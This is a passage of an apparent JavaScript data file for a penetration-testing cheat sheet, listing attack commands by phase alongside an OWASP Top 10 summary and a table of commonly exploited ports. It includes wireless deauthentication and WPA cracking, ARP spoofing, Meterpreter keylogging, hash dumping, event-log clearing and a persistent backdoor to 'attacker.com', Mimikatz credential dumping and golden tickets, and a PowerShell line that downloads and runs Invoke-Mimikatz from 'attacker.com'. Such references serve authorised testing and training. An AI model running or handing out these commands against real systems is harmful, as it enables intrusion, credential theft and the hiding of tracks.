                  command: 'medusa -h target.com -u admin -P passwords.txt -M http -m DIR:/admin',
                  description: "HTTP brute force",
                  category: "password-cracking"
                }
              ]
            },
            {
              name: "CeWL",
              description: "Custom wordlist generator",
              commands: [
                {
                  command: 'cewl http://target.com -w wordlist.txt',
                  description: "Generate wordlist from website",
                  category: "password-cracking"
                },
                {
                  command: 'cewl http://target.com -d 3 -m 5 -w wordlist.txt',
                  description: "Depth 3, minimum 5 chars",
                  category: "password-cracking"
                },
                {
                  command: 'cewl http://target.com --with-numbers -w wordlist.txt',
                  description: "Include numbers in wordlist",
                  category: "password-cracking"
                }
              ]
            }
          ]
        },
        
        {
          subtitle: "Wireless Attacks",
          description: "Wireless network exploitation",
          
          tools: [
            {
              name: "Aircrack-ng Suite",
              description: "Complete suite of wireless tools",
              commands: [
                {
                  command: 'airmon-ng start wlan0',
                  description: "Enable monitor mode",
                  category: "wireless"
                },
                {
                  command: 'airodump-ng wlan0mon',
                  description: "Scan for wireless networks",
                  category: "wireless"
                },
                {
                  command: 'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon',
                  description: "Capture packets from specific AP",
                  category: "wireless"
                },
                {
                  command: 'aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon',
                  description: "Deauth attack (capture handshake)",
                  category: "wireless"
                },
                {
                  command: 'aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap',
                  description: "Crack WPA/WPA2 from capture",
                  category: "wireless"
                },
                {
                  command: 'aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon',
                  description: "ARP replay attack",
                  category: "wireless"
                },
                {
                  command: 'aircrack-ng capture-01.cap',
                  description: "Crack WEP encryption",
                  category: "wireless"
                }
              ]
            },
            {
              name: "Reaver",
              description: "WPS brute force attack tool",
              commands: [
                {
                  command: 'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv',
                  description: "WPS brute force attack",
                  category: "wireless"
                },
                {
                  command: 'wash -i wlan0mon',
                  description: "Scan for WPS-enabled APs",
                  category: "wireless"
                }
              ]
            },
            {
              name: "Bettercap",
              description: "Network attack and monitoring framework",
              commands: [
                {
                  command: 'bettercap -iface eth0',
                  description: "Start bettercap",
                  category: "wireless"
                },
                {
                  command: 'net.probe on',
                  description: "Enable network discovery",
                  category: "wireless"
                },
                {
                  command: 'net.sniff on',
                  description: "Enable packet sniffing",
                  category: "wireless"
                },
                {
                  command: 'set arp.spoof.targets 192.168.1.100',
                  description: "Set ARP spoofing target",
                  category: "wireless"
                },
                {
                  command: 'arp.spoof on',
                  description: "Start ARP spoofing",
                  category: "wireless"
                }
              ]
            }
          ]
        }
      ]
    },
    
    {
      title: "Phase 4: Maintaining Access",
      description: "Establish persistent access to compromised systems",
      
      subsections: [
        {
          subtitle: "Post-Exploitation Tools",
          description: "Tools for maintaining access and privilege escalation",
          
          tools: [
            {
              name: "Meterpreter",
              description: "Advanced payload for Metasploit",
              commands: [
                {
                  command: 'sysinfo',
                  description: "Get system information",
                  category: "post-exploitation"
                },
                {
                  command: 'getuid',
                  description: "Get current user ID",
                  category: "post-exploitation"
                },
                {
                  command: 'getsystem',
                  description: "Attempt to gain SYSTEM privileges",
                  category: "post-exploitation"
                },
                {
                  command: 'hashdump',
                  description: "Dump password hashes",
                  category: "post-exploitation"
                },
                {
                  command: 'screenshot',
                  description: "Take screenshot",
                  category: "post-exploitation"
                },
                {
                  command: 'keyscan_start',
                  description: "Start keylogger",
                  category: "post-exploitation"
                },
                {
                  command: 'keyscan_dump',
                  description: "Dump keystrokes",
                  category: "post-exploitation"
                },
                {
                  command: 'ps',
                  description: "List running processes",
                  category: "post-exploitation"
                },
                {
                  command: 'migrate 1234',
                  description: "Migrate to process ID 1234",
                  category: "post-exploitation"
                },
                {
                  command: 'run post/windows/gather/enum_logged_on_users',
                  description: "Enumerate logged on users",
                  category: "post-exploitation"
                },
                {
                  command: 'run post/windows/gather/credentials/credential_collector',
                  description: "Collect credentials",
                  category: "post-exploitation"
                },
                {
                  command: 'download /path/to/file /local/path',
                  description: "Download file from target",
                  category: "post-exploitation"
                },
                {
                  command: 'upload /local/file /remote/path',
                  description: "Upload file to target",
                  category: "post-exploitation"
                },
                {
                  command: 'shell',
                  description: "Drop to system shell",
                  category: "post-exploitation"
                },
                {
                  command: 'run persistence -X -i 60 -p 4444 -r attacker.com',
                  description: "Install persistent backdoor",
                  category: "post-exploitation"
                },
                {
                  command: 'clearev',
                  description: "Clear event logs",
                  category: "post-exploitation"
                }
              ]
            },
            {
              name: "Mimikatz",
              description: "Windows credential extraction tool",
              commands: [
                {
                  command: 'privilege::debug',
                  description: "Get debug privileges",
                  category: "post-exploitation"
                },
                {
                  command: 'sekurlsa::logonpasswords',
                  description: "Dump credentials from memory",
                  category: "post-exploitation"
                },
                {
                  command: 'lsadump::sam',
                  description: "Dump SAM database",
                  category: "post-exploitation"
                },
                {
                  command: 'lsadump::secrets',
                  description: "Dump LSA secrets",
                  category: "post-exploitation"
                },
                {
                  command: 'kerberos::list',
                  description: "List Kerberos tickets",
                  category: "post-exploitation"
                },
                {
                  command: 'kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21... /krbtgt:hash /id:500',
                  description: "Create golden ticket",
                  category: "post-exploitation"
                }
              ]
            },
            {
              name: "Empire/Starkiller",
              description: "Post-exploitation framework",
              commands: [
                {
                  command: 'uselistener http',
                  description: "Create HTTP listener",
                  category: "post-exploitation"
                },
                {
                  command: 'usestager windows/launcher_bat',
                  description: "Generate batch stager",
                  category: "post-exploitation"
                },
                {
                  command: 'agents',
                  description: "List active agents",
                  category: "post-exploitation"
                },
                {
                  command: 'usemodule powershell/credentials/mimikatz/logonpasswords',
                  description: "Run Mimikatz module",
                  category: "post-exploitation"
                }
              ]
            },
            {
              name: "PowerSploit",
              description: "PowerShell post-exploitation framework",
              commands: [
                {
                  command: 'powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz"',
                  description: "Download and execute Mimikatz",
                  category: "post-exploitation"
                },
                {
                  command: 'Get-System',
                  description: "Elevate to SYSTEM",
                  category: "post-exploitation"
                },
                {
                  command: 'Invoke-AllChecks',
                  description: "Run PowerUp privilege escalation checks",
                  category: "post-exploitation"
                }
              ]
            }
          ]
        }
      ]
    },
    
    {
      title: "OWASP Top 10 - 2021",
      description: "Detailed breakdown of OWASP Top 10 vulnerabilities with exploitation techniques",
      
      vulnerabilities: [
        {
          rank: 1,
          name: "Broken Access Control",
          description: "Restrictions on authenticated users not properly enforced",
          severity: "Critical",
          examples: [
            "Bypassing access control checks by modifying URL, internal application state, or HTML page",
            "Permitting viewing or editing someone else's account",
            "Accessing API with missing access controls for POST, PUT and DELETE",
            "Elevation of privilege (acting as admin when logged in as user)",
            "Metadata manipulation (replaying or tampering JWT tokens)",
            "CORS misconfiguration allowing API access from unauthorized origins",
            "Force browsing to authenticated pages as unauthenticated user"
          ],
          testMethods: [
            "Parameter manipulation (change user ID in URL)",
            "Forced browsing to admin pages",
            "Missing function level access control",
            "Insecure direct object references (IDOR)"
          ],
          payloads: [
            {
              payload: "/user/profile?id=123 → /user/profile?id=456",
              description: "IDOR - Access another user's profile",
              context: "Parameter manipulation"
            },
            {
              payload: "/api/users/123 → /api/admin/users/123",
              description: "Path manipulation for privilege escalation",
              context: "API access control"
            }
          ]
        },
        {
          rank: 2,
          name: "Cryptographic Failures",
          description: "Sensitive data exposed due to weak or missing encryption",
          severity: "High",
          examples: [
            "Transmitting data in clear text (HTTP, FTP, SMTP)",
            "Using old or weak cryptographic algorithms",
            "Weak or default crypto keys",
            "Missing encryption for sensitive data at rest",
            "Improper certificate validation",
            "Lack of proper key management"
          ],
          testMethods: [
            "Check for HTTP instead of HTTPS",
            "Analyze encryption algorithms used",
            "Test for weak SSL/TLS configurations",
            "Check for sensitive data in browser storage"
          ],
          tools: [
            "SSLScan",
            "testssl.sh",
            "Nmap SSL scripts"
          ]
        },
        {
          rank: 3,
          name: "Injection",
          description: "Untrusted data sent to interpreter as part of command or query",
          severity: "Critical",
          types: [
            "SQL Injection",
            "NoSQL Injection",
            "OS Command Injection",
            "LDAP Injection",
            "XPath Injection",
            "XML Injection"
          ],
          covered: "See detailed SQL Injection and Command Injection sections above"
        },
        {
          rank: 4,
          name: "Insecure Design",
          description: "Missing or ineffective control design",
          severity: "High",
          examples: [
            "Lack of rate limiting leading to account takeover",
            "Missing business logic validation",
            "Trusting client-side controls",
            "Insufficient logging and monitoring"
          ]
        },
        {
          rank: 5,
          name: "Security Misconfiguration",
          description: "Insecure default configurations, incomplete setups, open cloud storage",
          severity: "High",
          examples: [
            "Missing security hardening",
            "Unnecessary features enabled",
            "Default accounts with passwords",
            "Error handling reveals stack traces",
            "Latest security features disabled",
            "Security settings in application servers not set to secure values",
            "Outdated software versions"
          ],
          testMethods: [
            "Check for default credentials",
            "Directory listing enabled",
            "Verbose error messages",
            "Unnecessary HTTP methods enabled",
            "Security headers missing"
          ]
        },
        {
          rank: 6,
          name: "Vulnerable and Outdated Components",
          description: "Using components with known vulnerabilities",
          severity: "High",
          examples: [
            "Unsupported or out of date software",
            "Not scanning for vulnerabilities regularly",
            "Not securing component configurations",
            "Developers not testing compatibility of updated libraries"
          ],
          tools: [
            "OWASP Dependency-Check",
            "Retire.js",
            "Snyk",
            "npm audit",
            "Bundle-audit (Ruby)"
          ]
        },
        {
          rank: 7,
          name: "Identification and Authentication Failures",
          description: "Broken authentication and session management",
          severity: "Critical",
          examples: [
            "Permits brute force attacks",
            "Permits default, weak, or well-known passwords",
            "Uses weak credential recovery (knowledge-based answers)",
            "Missing or ineffective multi-factor authentication",
            "Exposes session identifiers in URL",
            "Doesn't properly invalidate session tokens"
          ],
          testMethods: [
            "Test password policy",
            "Session fixation testing",
            "Session timeout testing",
            "Brute force protection testing"
          ]
        },
        {
          rank: 8,
          name: "Software and Data Integrity Failures",
          description: "Code and infrastructure that doesn't protect against integrity violations",
          severity: "Critical",
          examples: [
            "Insecure CI/CD pipeline",
            "Auto-update without integrity verification",
            "Insecure deserialization",
            "CDN or content from untrusted sources"
          ],
          covered: "See Insecure Deserialization section above"
        },
        {
          rank: 9,
          name: "Security Logging and Monitoring Failures",
          description: "Insufficient logging and monitoring, coupled with ineffective incident response",
          severity: "Medium",
          examples: [
            "Auditable events not logged",
            "Warnings and errors generate no/inadequate log messages",
            "Logs not monitored for suspicious activity",
            "Logs only stored locally",
            "Alerting thresholds and response escalation not in place"
          ]
        },
        {
          rank: 10,
          name: "Server-Side Request Forgery (SSRF)",
          description: "Web application fetching remote resource without validating user-supplied URL",
          severity: "High",
          covered: "See detailed SSRF section above"
        }
      ]
    },
    
    {
      title: "Common Network Ports & Services",
      description: "Commonly exploited ports and their services",
      
      ports: [
        { port: 20, service: "FTP Data", vulnerabilities: ["Cleartext credentials", "Anonymous access"] },
        { port: 21, service: "FTP Control", vulnerabilities: ["Cleartext credentials", "Anonymous access", "Brute force"] },
        { port: 22, service: "SSH", vulnerabilities: ["Weak credentials", "Key exposure", "Version vulnerabilities"] },
        { port: 23, service: "Telnet", vulnerabilities: ["Cleartext credentials", "No encryption"] },
        { port: 25, service: "SMTP", vulnerabilities: ["Email spoofing", "Open relay", "User enumeration"] },
        { port: 53, service: "DNS", vulnerabilities: ["Zone transfer", "DNS amplification", "Cache poisoning"] },
        { port: 80, service: "HTTP", vulnerabilities: ["Web application attacks", "Cleartext traffic"] },
        { port: 110, service: "POP3", vulnerabilities: ["Cleartext credentials", "Email harvesting"] },
        { port: 111, service: "RPCbind", vulnerabilities: ["Service enumeration", "RPC exploits"] },
        { port: 135, service: "MSRPC", vulnerabilities: ["Windows enumeration", "RPC exploits"] },
        { port: 139, service: "NetBIOS", vulnerabilities: ["SMB enumeration", "Null sessions"] },
        { port: 143, service: "IMAP", vulnerabilities: ["Cleartext credentials", "Email harvesting"] },
        { port: 161, service: "SNMP", vulnerabilities: ["Community string brute force", "Information disclosure"] },
        { port: 389, service: "LDAP", vulnerabilities: ["LDAP injection", "Anonymous bind"] },
        { port: 443, service: "HTTPS", vulnerabilities: ["SSL/TLS vulnerabilities", "Certificate issues"] },
        { port: 445, service: "SMB", vulnerabilities: ["EternalBlue", "PSExec", "Credential theft"] },
        { port: 1433, service: "MSSQL", vulnerabilities: ["SQL injection", "xp_cmdshell", "Weak credentials"] },
        { port: 1521, service: "Oracle DB", vulnerabilities: ["SQL injection", "Default credentials"] },
        { port: 3306, service: "MySQL", vulnerabilities: ["SQL injection", "Weak credentials", "UDF exploitation"] },
        { port: 3389, service: "RDP", vulnerabilities: ["BlueKeep", "Weak credentials", "Brute force"] },
        { port: 5432, service: "PostgreSQL", vulnerabilities: ["SQL injection", "Command execution"] },
        { port: 5900, service: "VNC", vulnerabilities: ["Weak/no authentication", "Screen capture"] },
        { port: 6379, service: "Redis", vulnerabilities: ["No authentication", "Remote code execution"] },
        { port: 8080, service: "HTTP Proxy", vulnerabilities: ["Web application attacks", "Tomcat exploits"] },
        { port: 8443, service: "HTTPS Alt", vulnerabilities: ["SSL/TLS issues", "Web app vulnerabilities"] },
        { port: 27017, service: "MongoDB", vulnerabilities: ["No authentication", "NoSQL injection"] }
      ]
    }
  ]
};